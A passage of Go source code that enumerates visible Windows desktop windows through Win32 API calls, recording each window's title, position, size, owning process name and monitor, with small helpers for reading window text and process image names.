                                        monIdx = i
                                }
                        }
                }

                result = append(result, BackstageWindowInfo{
                        HWND:        w.hwnd,
                        Title:       title,
                        X:           winLeft,
                        Y:           winTop,
                        Width:       winW,
                        Height:      winH,
                        PID:         pid,
                        ProcessName: procName,
                        Monitor:     monIdx,
                        Visible:     true,
                })
        }
        return result, monInfos
}

type BackstageMonitorInfo struct {
        Index   int
        Name    string
        X       int
        Y       int
        Width   int
        Height  int
        Primary bool
}

func getWindowText(hwnd uintptr) string {
        length, _, _ := procGetWindowTextLenW.Call(hwnd)
        if length == 0 {
                return ""
        }
        buf := make([]uint16, length+1)
        procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(length+1))
        return syscall.UTF16ToString(buf)
}

func getProcessName(pid uint32) string {
        const PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
        hProc, _, _ := procOpenProcess.Call(PROCESS_QUERY_LIMITED_INFORMATION, 0, uintptr(pid))
        if hProc == 0 {
                return ""
        }
        defer procCloseHandle.Call(hProc)
        var buf [260]uint16
        size := uint32(len(buf))
        ret, _, _ := kernel32.NewProc("QueryFullProcessImageNameW").Call(
                hProc, 0, uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&size)),
        )
        if ret == 0 {
                return ""
        }
        fullPath := syscall.UTF16ToString(buf[:size])
        for i := len(fullPath) - 1; i >= 0; i-- {
                if fullPath[i] == '\\' || fullPath[i] == '/' {
                        return fullPath[i+1:]
                }
        }
        return fullPath
}
